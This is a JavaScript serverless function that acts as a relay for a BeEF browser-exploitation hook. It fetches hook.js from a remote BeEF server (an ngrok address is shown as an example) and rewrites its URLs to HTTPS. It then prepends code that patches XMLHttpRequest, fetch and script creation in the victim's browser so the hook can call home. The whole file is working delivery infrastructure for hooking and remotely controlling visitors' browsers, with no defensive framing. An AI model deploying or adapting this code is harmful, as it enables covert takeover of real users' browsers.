/**
 * Vercel Serverless Function - Robust Proxy for BeEF hook.js
 * Replaces http:// and protocol-relative // references to the configured BEEF server
 */

function escapeRegExp(string) {
  return string.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

export default async function handler(req, res) {
  // CORS + basic headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
  res.setHeader("Content-Type", "application/javascript");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");

  if (req.method === "OPTIONS") {
    res.status(200).end();
    return;
  }

  if (req.method !== "GET") {
    res.status(405).json({ error: "Method not allowed" });
    return;
  }

  const beefServerUrl = process.env.BEEF_SERVER_URL;
  if (!beefServerUrl) {
    console.error("BEEF_SERVER_URL environment variable not set");
    res
      .status(500)
      .send("// Configuration error: BeEF server URL not configured");
    return;
  }

  // Validate and normalize the configured URL
  let beefUrl;
  try {
    beefUrl = new URL(beefServerUrl);
  } catch (e) {
    console.error("Invalid BEEF_SERVER_URL:", beefServerUrl);
    res.status(500).send("// Configuration error: invalid BeEF server URL");
    return;
  }

  const origin = beefUrl.origin.replace(/\/+$/, ""); // e.g. "https://95b27dbafdff.ngrok-free.app"
  const hostname = beefUrl.hostname; // e.g. "95b27dbafdff.ngrok-free.app"
  const escHost = escapeRegExp(hostname);

  try {
    // Fetch the original hook.js from the BeEF server
    const response = await fetch(`${origin}/hook.js`, {
      headers: {
        "ngrok-skip-browser-warning": "true",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
    });

    if (!response.ok) {
      console.error(
        `Failed to fetch hook.js: ${response.status} ${response.statusText}`
      );
      res.status(502).send("// Failed to fetch hook.js from BeEF server");
      return;
    }

    let hookScript = await response.text();

    // --- Robust replacements ---
    // 1) Replace `http://hostname(:port)?`
    const httpHostRegex = new RegExp(`http:\\/\\/${escHost}(?::\\d+)?`, "g");

    // 2) Replace protocol-relative `//hostname(:port)?`
    const protoRelRegex = new RegExp(`\\/\\/${escHost}(?::\\d+)?`, "g");

    // 3) Replace bare `hostname:port` occurrences (rare, but sometimes embedded)
    const hostPortRegex = new RegExp(`${escHost}:\\d+`, "g");

    // Count occurrences (for logging)
    const countHttpHost = (hookScript.match(httpHostRegex) || []).length;
    const countProtoRel = (hookScript.match(protoRelRegex) || []).length;
    const countHostPort = (hookScript.match(hostPortRegex) || []).length;

    // Perform replacements -> replace with full origin (https://host or https://host:port)
    if (countHttpHost) hookScript = hookScript.replace(httpHostRegex, origin);
    if (countProtoRel) hookScript = hookScript.replace(protoRelRegex, origin);
    if (countHostPort) {
      hookScript = hookScript.replace(
        hostPortRegex,
        origin.replace(/^https?:\/\//, "")
      );
    }

    // Extra: Replace any stray `http://<origin-without-scheme>` with origin
    const originWithoutScheme = escapeRegExp(
      origin.replace(/^https?:\/\//, "")
    );
    const httpFullOriginRegex = new RegExp(
      `http:\\/\\/${originWithoutScheme}`,
      "g"
    );
    if ((hookScript.match(httpFullOriginRegex) || []).length) {
      hookScript = hookScript.replace(httpFullOriginRegex, origin);
    }

    // CRITICAL FIX: Inject URL interceptor at the START of hook.js
    // This patches BeEF's AJAX calls to rewrite HTTP URLs to HTTPS at runtime
    const urlInterceptor = `
// === INJECTED URL INTERCEPTOR FOR MIXED CONTENT FIX ===
(function() {
  const BEEF_ORIGIN = '${origin}';
  const BEEF_HOST = '${hostname}';
  
  // Helper function to rewrite URLs
  function rewriteUrl(url) {
    if (!url) return url;
    let fixedUrl = String(url);
    
    // Replace http://beef-host:3000 with https://beef-host
    if (fixedUrl.includes('http://' + BEEF_HOST)) {
      fixedUrl = fixedUrl.replace(/http:\\/\\/[^/]+/, BEEF_ORIGIN);
      console.log('[BeEF Proxy] Rewrote URL:', url, '->', fixedUrl);
      return fixedUrl;
    }
    return url;
  }
  
  // 1. Patch XMLHttpRequest.open
  const originalOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url, ...args) {
    return originalOpen.call(this, method, rewriteUrl(url), ...args);
  };
  
  // 2. Patch fetch
  if (window.fetch) {
    const originalFetch = window.fetch;
    window.fetch = function(url, ...args) {
      return originalFetch.call(this, rewriteUrl(url), ...args);
    };
  }
  
  // 3. CRITICAL: Patch HTMLScriptElement.src setter (for dynamic script tags)
  const scriptDescriptor = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
  if (scriptDescriptor && scriptDescriptor.set) {
    const originalSrcSetter = scriptDescriptor.set;
    Object.defineProperty(HTMLScriptElement.prototype, 'src', {
      set: function(value) {
        const rewritten = rewriteUrl(value);
        return originalSrcSetter.call(this, rewritten);
      },
      get: scriptDescriptor.get,
      configurable: true,
      enumerable: true
    });
  }
  
  // 4. Patch document.createElement to intercept script creation
  const originalCreateElement = document.createElement;
  document.createElement = function(tagName, ...args) {
    const element = originalCreateElement.call(document, tagName, ...args);
    
    // If creating a script tag, patch its src attribute
    if (tagName && tagName.toLowerCase() === 'script') {
      const originalSetAttribute = element.setAttribute;
      element.setAttribute = function(name, value) {
        if (name === 'src') {
          value = rewriteUrl(value);
        }
        return originalSetAttribute.call(this, name, value);
      };
    }
    
    return element;
  };
  
  console.log('[BeEF Proxy] URL interceptor initialized for:', BEEF_ORIGIN);
})();
// === END URL INTERCEPTOR ===

`;

    // Prepend the interceptor to the hook script
    hookScript = urlInterceptor + hookScript;

    console.log(
      `Proxied hook.js from ${origin} — replacements: http:${countHttpHost}, protoRel:${countProtoRel}, hostPort:${countHostPort} + runtime interceptor injected`
    );

    // Basic sanity check: ensure we are returning JS (not an HTML error page)
    const maybeHtml = /<html|<!doctype html/i.test(hookScript);
    if (maybeHtml) {
      console.warn(
        "Fetched hook.js looks like HTML (possible error page). Returning it anyway."
      );
    }

    res.status(200).send(hookScript);
  } catch (error) {
    console.error("Error fetching or processing hook.js:", error);
    res.status(502).send(`// Error: ${error.message}`);
  }
}
